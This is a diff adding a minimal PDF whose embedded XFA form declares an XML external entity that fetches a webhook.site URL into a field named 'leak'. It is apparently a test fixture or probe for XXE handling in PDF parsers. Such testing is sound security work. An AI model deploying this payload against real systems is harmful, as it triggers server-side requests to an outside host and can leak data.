@@ -1,0 +1,43 @@
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog /AcroForm 2 0 R /Pages 4 0 R >>
+endobj
+2 0 obj
+<< /XFA [ (xdp:doc) 3 0 R ] >>
+endobj
+3 0 obj
+<< /Length 497 >>
+stream
+<?xml version="1.0"?>
+<!DOCTYPE xfa [
+ <!ENTITY xxe SYSTEM "https://webhook.site/30c557ee-0354-4157-a8b8-bad3cfaeaeeb">
+]>
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+ <template xmlns="http://www.xfa.org/schema/xfa-template/2.8/">
+ <subform name="form1"><field name="leak"><ui><textEdit/></ui>
+ <value><text>&xxe;</text></value></field></subform>
+ </template>
+ <xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
+ <xfa:data><leak>&xxe;</leak></xfa:data></xfa:datasets>
+</xdp:xdp>
+endstream
+endobj
+4 0 obj
+<< /Type /Pages /Kids [5 0 R] /Count 1 >>
+endobj
+5 0 obj
+<< /Type /Page /Parent 4 0 R /MediaBox [0 0 200 200] >>
+endobj
+xref
+0 6
+0000000000 65535 f 
+0000000009 00000 n 
+0000000074 00000 n 
+0000000120 00000 n 
+0000000668 00000 n 
+0000000725 00000 n 
+trailer
+<< /Size 6 /Root 1 0 R >>
+startxref
+796
+%%EOF
